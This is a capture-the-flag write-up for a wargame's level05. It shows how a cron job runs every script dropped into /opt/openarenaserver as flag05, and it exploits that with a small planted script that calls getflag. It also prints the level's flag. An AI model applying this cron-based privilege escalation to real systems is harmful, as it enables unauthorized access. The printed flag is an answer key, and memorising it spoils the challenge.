
# You have a new mail

By connecting to **level05**, you will receive an hint.

![enter image description here](https://i.imgur.com/giz9UKO.png)

Incoming mail is stored in the system mailbox. By default, a user’s system mailbox is a file located in the **```/var/spool/mail```** directory.

In the directory, there is a level05 file, in which there is a crontab.

```bash
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

```bash
* * * * * cmd to execute
- - - - -
| | | | |
| | | | ----- Days (0 - 7) (Sunday - Saturday, 0 and 7 are equal)
| | | ------- Month (1 - 12)
| | --------- Day (1 - 31)
| ----------- Hour (0 - 23)
------------- Min (0 - 59)
```

In the case of the given crontab :

-   **`/2`** : This part indicates that the command will be executed every two minutes. This means that the task will run every two minutes, regardless of the time or day.

-   **`* * * *`** : The asterisk means that the cron will fire on every change of that value. In our context, every 2 minutes of every day of every week of every month, that command runs.

-   **`su -c "sh /usr/sbin/openarenaserver" - flag05`** : This is the actual command that will be executed every two minutes. This command uses the `su` program to switch to flag05. It then runs a shell (`sh`) to run the 
**`/usr/sbin/openarenaserver`** script.

In the script **`/usr/sbin/openarenaserver`** we find this content :

```bash
#!/bin/sh
for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

And these permissions :

![enter image description here](https://i.imgur.com/26mY1pv.png)

In summary, this script scans all the files present in the **```/opt/openarenaserver```** directory, executes each file with the bash shell setting a CPU time limit of 5 seconds, displays the executed commands, and then deletes 
the file after it runs.

In this case, if this program runs each file in the directory mentioned above, we just need to create an executable with this code inside.

```bash
#!/bin/sh
getflag > /tmp/flag.txt
```

> Flag : `viuaaale9huek52boumoomioc`
